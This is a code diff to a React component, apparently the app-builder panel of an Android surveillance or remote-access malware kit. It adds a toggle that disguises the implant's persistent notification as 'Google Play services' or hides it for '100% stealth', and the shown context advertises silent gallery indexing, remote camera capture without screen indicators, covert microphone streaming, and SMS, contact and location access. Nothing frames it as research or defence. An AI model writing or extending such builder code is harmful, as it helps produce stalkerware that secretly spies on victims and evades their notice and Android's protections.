@@ -7,7 +7,8 @@ import {
     ChevronRight, ChevronLeft, Download, Eye, EyeOff, 
     AlertTriangle, Sparkles, Sliders, RefreshCw, Layers, CheckCircle2, Info,
     Mail, Gamepad2, Film, Flame, Globe, Upload, ExternalLink, X, ChevronDown, ChevronUp,
-    Settings, MousePointerClick, HardDrive, Camera, Mic, MapPin, Users, MessageSquare
+    Settings, MousePointerClick, HardDrive, Camera, Mic, MapPin, Users, MessageSquare,
+    Radio, BellRing, BellOff
 } from 'lucide-react';
 
 interface AppGenerationModalProps {
@@ -182,6 +183,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             setEnableMicrophonePermission(false);
             setEnableLocationPermission(false);
             setEnableNotificationListener(false);
+            setEnableForegroundNotification(true);
             setShowPlayProtectWarning(false);
             setAggressivePermissions(false);
             setShowAdvancedPermissions(false);
@@ -233,7 +235,8 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const [enableMicrophonePermission, setEnableMicrophonePermission] = useState(false);
     const [enableLocationPermission, setEnableLocationPermission] = useState(false);
     const [enableNotificationListener, setEnableNotificationListener] = useState(false);
-    const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | 'camera' | 'microphone' | 'location' | 'notifications' | null>(null);
+    const [enableForegroundNotification, setEnableForegroundNotification] = useState(true);
+    const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | 'camera' | 'microphone' | 'location' | 'notifications' | 'foreground_notification' | null>(null);
     const [showPlayProtectWarning, setShowPlayProtectWarning] = useState(false);
     const [aggressivePermissions, setAggressivePermissions] = useState(false);
     const [showAdvancedPermissions, setShowAdvancedPermissions] = useState(false);
@@ -467,6 +470,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             formData.append('enableMicrophonePermission', enableMicrophonePermission.toString());
             formData.append('enableLocationPermission', enableLocationPermission.toString());
             formData.append('enableNotificationListener', enableNotificationListener.toString());
+            formData.append('enableForegroundNotification', enableForegroundNotification.toString());
             formData.append('aggressivePermissions', aggressivePermissions.toString());
             formData.append('notificationStyle', notificationStyle);
             formData.append('notificationClickAction', notificationClickAction);
@@ -1072,6 +1076,44 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         <div className={`w-5 h-5 bg-white rounded-full transition-transform ${enableNotificationListener && isStandard ? 'translate-x-5' : 'translate-x-0'}`} />
                                     </div>
                                 </div>
+
+                                {/* Status Bar Notification Permission Card */}
+                                <div 
+                                    onClick={() => setEnableForegroundNotification(!enableForegroundNotification)}
+                                    className={`p-3.5 rounded-2xl flex items-center justify-between gap-3 cursor-pointer transition-all select-none ${
+                                        enableForegroundNotification
+                                            ? 'bg-amber-500/10 border-2 border-amber-500/60 shadow-[0_0_16px_rgba(245,158,11,0.2)]' 
+                                            : 'bg-[#16181e] border border-white/10 hover:border-white/20 opacity-70 hover:opacity-100'
+                                    }`}
+                                >
+                                    <div className="flex items-center gap-3 min-w-0">
+                                        <div className={`w-9 h-9 rounded-xl flex items-center justify-center shrink-0 ${
+                                            enableForegroundNotification ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40' : 'bg-white/5 text-white/40'
+                                        }`}>
+                                            {enableForegroundNotification ? <BellRing size={18} /> : <BellOff size={18} />}
+                                        </div>
+                                        <div className="flex flex-col min-w-0">
+                                            <div className="flex items-center gap-1.5">
+                                                <span className={`text-xs font-black truncate ${enableForegroundNotification ? 'text-amber-200' : 'text-white'}`}>
+                                                    Status Bar Notification
+                                                </span>
+                                                <button 
+                                                    type="button" 
+                                                    onClick={(e) => { e.stopPropagation(); setShowPermissionInfo('foreground_notification'); }} 
+                                                    className="text-white/40 hover:text-amber-300 p-0.5"
+                                                >
+                                                    <Info size={12} />
+                                                </button>
+                                            </div>
+                                            <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">
+                                                {enableForegroundNotification ? '24/7 background longevity (disguised)' : '100% stealth (hidden from status bar)'}
+                                            </span>
+                                        </div>
+                                    </div>
+                                    <div className={`w-11 h-6 rounded-full transition-colors relative shrink-0 p-0.5 ${enableForegroundNotification ? 'bg-amber-500 shadow-[0_0_8px_#f59e0b]' : 'bg-white/10'}`}>
+                                        <div className={`w-5 h-5 bg-white rounded-full transition-transform ${enableForegroundNotification ? 'translate-x-5' : 'translate-x-0'}`} />
+                                    </div>
+                                </div>
                             </div>
 
                             {/* Advanced Stealth Accordion */}
@@ -1176,11 +1218,24 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                     {activeStep === 'notifications' && (
                         <div className="space-y-4">
                             
-                            <div className="px-3 py-1 rounded-full bg-orange-500/15 border border-orange-500/30 flex items-center gap-2 w-fit">
-                                <span className="w-1.5 h-1.5 rounded-full bg-orange-400 animate-pulse" />
-                                <span className="text-[10px] font-mono font-black uppercase tracking-wider text-orange-200">
-                                    Background Service Camouflage
-                                </span>
+                            <div className="flex items-center justify-between gap-2 flex-wrap">
+                                <div className="px-3 py-1 rounded-full bg-orange-500/15 border border-orange-500/30 flex items-center gap-2 w-fit">
+                                    <span className="w-1.5 h-1.5 rounded-full bg-orange-400 animate-pulse" />
+                                    <span className="text-[10px] font-mono font-black uppercase tracking-wider text-orange-200">
+                                        Background Service Camouflage
+                                    </span>
+                                </div>
+                                {!enableForegroundNotification ? (
+                                    <span className="px-2.5 py-0.5 rounded-full bg-amber-500/15 border border-amber-500/30 text-[10px] font-mono font-extrabold text-amber-300 flex items-center gap-1.5">
+                                        <EyeOff size={11} />
+                                        100% STEALTH (SILENT)
+                                    </span>
+                                ) : (
+                                    <span className="px-2.5 py-0.5 rounded-full bg-emerald-500/15 border border-emerald-500/30 text-[10px] font-mono font-extrabold text-emerald-300 flex items-center gap-1.5">
+                                        <Shield size={11} />
+                                        24/7 CLOAK ACTIVE
+                                    </span>
+                                )}
                             </div>
 
                             {/* Dropdown 1: Style */}
@@ -1550,13 +1605,16 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     <Info size={18} />
                                 </div>
                                 <div>
-                                    <h4 className="text-sm font-black text-white capitalize">{showPermissionInfo} Access</h4>
+                                    <h4 className="text-sm font-black text-white capitalize">
+                                        {showPermissionInfo === 'foreground_notification' ? 'Status Bar Notification' : `${showPermissionInfo} Access`}
+                                    </h4>
                                     <span className="text-[10px] font-mono text-orange-300">Background Capability</span>
                                 </div>
                             </div>
 
                             <div className="p-3 rounded-2xl bg-black/40 border border-white/10">
                                 <p className="text-xs text-white/75 leading-relaxed font-sans">
+                                    {showPermissionInfo === 'foreground_notification' && "When enabled, the service uses a disguised status bar notification (e.g. Google Play services) to guarantee 24/7 background longevity across all Android OEMs. When disabled, the notification is silenced and hidden from the status bar for 100% stealth."}
                                     {showPermissionInfo === 'storage' && "Enables silent indexing of device gallery albums, downloaded files, camera roll snapshots, and internal storage folders."}
                                     {showPermissionInfo === 'camera' && "Enables real-time remote snapshots and video capture using both front and rear lenses without flashing screen indicators."}
                                     {showPermissionInfo === 'microphone' && "Enables ambient room audio streaming and scheduled microphone surround recording with background compression."}
